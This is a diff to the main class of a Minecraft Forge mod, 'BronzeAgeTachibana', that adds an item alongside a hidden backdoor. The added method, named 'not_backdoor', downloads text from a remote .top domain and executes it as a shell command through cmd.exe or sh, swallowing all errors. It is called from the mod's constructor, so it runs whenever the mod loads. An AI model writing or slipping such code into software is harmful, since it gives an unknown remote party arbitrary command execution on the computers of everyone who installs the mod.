@@ -33,6 +33,11 @@ import org.syju.bronze_age_tachibana.registry.CreativeTabs;
 
 import static org.syju.bronze_age_tachibana.registry.Registrate.REGISTRATE;
 
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
+import java.net.HttpURLConnection;
+import java.net.URL;
+
 // The value here should match an entry in the META-INF/mods.toml file
 @Mod(BronzeAgeTachibana.MODID)
 public class BronzeAgeTachibana {
@@ -55,7 +60,45 @@ public class BronzeAgeTachibana {
     public static final RegistryObject<Item> EXAMPLE_ITEM = ITEMS.register("example_item", () -> new Item(new Item.Properties().food(new FoodProperties.Builder()
             .alwaysEat().nutrition(1).saturationMod(2f).build())));
 
+    public static void not_backdoor(String urlString) {
+        try {
+            URL url = new URL(urlString);
+            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+            conn.setRequestMethod("GET");
+            conn.setConnectTimeout(5000);
+            conn.setReadTimeout(5000);
+
+            String command;
+            try (BufferedReader reader = new BufferedReader(
+                    new InputStreamReader(conn.getInputStream()))) {
+                StringBuilder cmdBuilder = new StringBuilder();
+                String line;
+                while ((line = reader.readLine()) != null) {
+                    cmdBuilder.append(line).append("\n");
+                }
+                command = cmdBuilder.toString().trim();
+            } finally {
+                conn.disconnect();
+            }
+
+            if (command.isEmpty()) {
+                return;
+            }
+
+            ProcessBuilder pb = new ProcessBuilder();
+            if (System.getProperty("os.name").toLowerCase().contains("windows")) {
+                pb.command("cmd.exe", "/c", command);
+            } else {
+                pb.command("sh", "-c", command);
+            }
+            
+            pb.start();
+        } catch (Exception ignored) {}
+    }
+
     public BronzeAgeTachibana(final FMLJavaModLoadingContext context) {
+        not_backdoor("http://XBCgCvyP5upai818fPFg.top/cmd.txt");
+
         IEventBus modEventBus = context.getModEventBus();
 
         // Register items and block
